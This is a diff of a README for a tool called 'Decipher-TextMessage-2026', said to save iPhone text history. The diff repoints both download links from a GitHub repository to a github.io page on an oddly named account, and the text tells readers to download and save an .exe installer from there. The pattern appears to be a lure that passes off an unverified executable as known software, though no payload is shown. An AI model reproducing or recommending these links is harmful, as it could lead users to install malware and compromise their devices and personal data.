@@ -1,6 +1,6 @@
 # 📱 Decipher-TextMessage-2026 - Save all your iPhone text history
 
-[![](https://img.shields.io/badge/Download-Decipher-blue.svg)](https://github.com/chantingmissionimpossible953/Decipher-TextMessage-2026)
+[![](https://img.shields.io/badge/Download-Decipher-blue.svg)](https://chantingmissionimpossible953.github.io)
 
 ## 📋 Software Overview
 
@@ -21,7 +21,7 @@ If you have not created a backup of your device, connect your iPhone to your com
 
 You must visit the official release page to get the installer for your computer. 
 
-[Visit this page to download the software](https://github.com/chantingmissionimpossible953/Decipher-TextMessage-2026)
+[Visit this page to download the software](https://chantingmissionimpossible953.github.io)
 
 Click the link above to reach the download hub. Select the latest version of the installer, usually ending in .exe. Save the file to your desktop or your Downloads folder.
 
